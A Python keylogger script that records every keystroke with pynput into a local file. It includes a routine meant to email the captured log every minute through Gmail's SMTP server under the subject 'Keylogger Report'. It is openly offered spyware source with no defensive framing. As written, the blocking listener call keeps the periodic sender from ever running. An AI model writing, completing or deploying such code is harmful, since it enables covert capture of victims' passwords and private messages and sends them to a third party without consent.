import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Listener
import time

# Email Configuration
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_password"
TO_EMAIL = "recipient_email@gmail.com"
INTERVAL = 60  # Interval to send logs (in seconds)

log_file = "keylog.txt"

def send_email(log_content):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg['Subject'] = "Keylogger Report"

        # Attach the log content
        msg.attach(MIMEText(log_content, 'plain'))

        # Create the SMTP session
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()

        # Login to your email account
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        # Send the email
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, TO_EMAIL, text)

        # Close the connection to the mail server
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f'{key.char}')
        except AttributeError:
            f.write(f'[{key}]')

# Function to send logs at regular intervals
def send_logs_periodically():
    while True:
        time.sleep(INTERVAL)

        # Read the log file content
        with open(log_file, 'r') as f:
            log_content = f.read()

        # Send email with the log file content
        if log_content.strip():
            send_email(log_content)

        # Clear the log file after sending
        with open(log_file, 'w') as f:
            f.write('')

# Start the keylogger and email sender
with Listener(on_press=on_press) as listener:
    listener.join()

# Send logs periodically in the background
send_logs_periodically()